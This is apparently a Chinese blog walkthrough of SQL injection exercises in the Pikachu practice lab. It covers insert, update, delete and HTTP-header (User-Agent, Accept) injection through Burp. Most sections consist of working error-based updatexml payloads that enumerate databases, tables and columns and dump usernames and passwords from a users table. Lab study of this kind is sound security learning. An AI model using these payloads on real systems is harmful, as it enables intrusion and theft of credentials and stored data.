---
title: Pikachu-SQL注入（三）
tags:
  - pikachu
categories:
  - 学习
  - web安全
  - Pikachu
abbrlink: 49a53027
date: 2022-05-07 14:46:51
---



### insert&update注入

insert/update是插入和更新的意思，这两个场景的注入，post数据包里的每一个参数都可以注入

#### insert注入

首先在注册的时候抓包分析。

![41](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144400.png)



注册页面，在**用户**框内输入单引号，密码为必填项，随意输入几个数字，提交。页面返回报错信息如图

![42](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144409.png)



 由报错信息可以知道，输入的数据直接拼接入该sql查询语句中，存在着SQL注入漏洞。



1.查找数据库

```
1' or updatexml(1,concat(0x7e,database()),1)) #	
```



![43](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144417.png)

2.查找数据库中的表

```
1' or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema = database() limit 0,1)),1))#
```

![44](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144420.png)



3.查找指定表中的字段名

```
1' or updatexml(1,concat(0x7e,(select group_concat(column_name )  from information_schema.columns where table_schema= database() and table_name='users'),0x7e),2)or '
```



![45](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144423.png)

查询指定表下的所有数据

```
1' or updatexml(1,concat(0x7e,(select group_concat(id,username,password,level) from users),0x7e),1) or '
或用limit读取
' or updatexml(1,concat(0x7e,(select password from users limit 1,1)),1)or'
```



![46](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144425.png)



#### update注入

注： 只有性别，手机，住址，邮箱全都有值的时候，才会执行修改用户信息的操作，否则该操作不执行



修改页面，在**性别**框内输入单引号，其他几项必填项，随意输入几个数字，提交。页面返回报错信息如图

![47](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144427.png)



 由报错信息可以知道，输入的数据直接拼接入该sql查询语句中，存在着SQL注入漏洞。





查询指定字段的内容

```
' or updatexml(1,concat(0x7e,(select group_concat(username) from users)),1)or'
```

![48](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144429.png)



查询指定数据库表名

```
' or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),2) or '
```

![49](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144431.png)





查询指定表下的字段名

```
' or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),0x7e),2) or '
```

![50](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144434.png)



查询指定表下的所有数据 

```
' or+updatexml(1,concat(0x7e,(select group_concat(id,username,password,level) from users),0x7e),2) or ' 
或用limit读取
' or updatexml(1,concat(0x7e,(select password from users limit 1,1)),1)or'
```

![51](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144437.png)





### delete注入

 页面为空白的留言板，输入框是无法注入的。随便加入几条信息，可以看到留言列表多出了刚刚插入的信息。

![52](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144439.png)



既然都说了时delete注入，那肯定和删除有关了，我们在删除时抓包，可以看到是get型传参

![53](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144441.png)



 右键发送至Repeater，可以通过修改URL的id参数进行SQL注入。

修改id=58',报错，可判断存在SQL注入

![54](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144443.png)



可以直接在url进行操作，查询数据库名pikachu

```
1+or+updatexml(1,concat(0x7e,database()),0)
或
59%20or%20updatexml(1,concat(0x7e,(select%20database())),1)	
```

![55](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144445.png)



查询指定数据库表名

```
56+and+updatexml(1,concat(0x7e,(select+group_concat(schema_name)+from+information_schema.schemata),0x7e),2)
```

![56](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144447.png)



```
56+and+updatexml(1,concat(0x7e,(select+group_concat(column_name)+from+information_schema.columns+where+table_schema=database()+and+table_name='users'),0x7e),2)
```

![57](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144449.png)



查询表下所有数据

```
56+or+updatexml(1,concat(0x7e,(select+group_concat(id,username,password,level)+from+users),0x7e),2)
或拖过limit读取
56+or+updatexml(1,concat(0x7e,(select+password+from+users+limit+0,1)),1)
```

![58](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144450.png)



### http header注入

输入admin/123456，点击login登录

![59](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144452.png)





 打开burp的拦截，刷新该页面，将拦截到的报文发送至repeater。

修改user agent或Accept参数注入



#### User-Agent:处注入

查询数据库名

```
' or updatexml(1,concat(0x7e,(select database())),1)or'
```

![60](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144457.png)





查询所有数据库

```
 ' or updatexml(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata),0x7e),2)or '
```

![61](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144502.png)



查询指定数据库表名

```
 ' or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),2)or '
```

![62](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144505.png)



查询指定表下的字段名

```
' or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),0x7e),2)or '
```

![63](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144507.png)





查询指定表下的所有数据

```
 ' or updatexml(1,concat(0x7e,(select group_concat(id,username,password,level) from users),0x7e),2)or '
或者
' or updatexml(1,concat(0x7e,(select password from users limit 0,1)),1)or'
```

![64](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144509.png)



#### Accept处注入

查询数据库名

```
' or updatexml(1,concat(0x7e,(select database())),1)or'
```

![65](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144512.png)



查询所有数据库

```
 ' or updatexml(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata),0x7e),2)or '
```

![66](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144515.png)



查询指定数据库表名

```
 ' or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),2)or '
```

![67](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144517.png)



查询指定表下的字段名

```
' or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),0x7e),2)or '
```

![68](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144519.png)

查询指定表下的所有数据

```
 ' or updatexml(1,concat(0x7e,(select group_concat(id,username,password,level) from users),0x7e),2)or '
或者
' or updatexml(1,concat(0x7e,(select password from users limit 0,1)),1)or'
```

![69](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144521.png)









---

参考链接： 

无垠安全：https://www.wuyini.cn/952.html

Pikachu靶场通关之SQL注入 - FreeBuf网络安全行业门户：https://www.freebuf.com/articles/web/254079.html
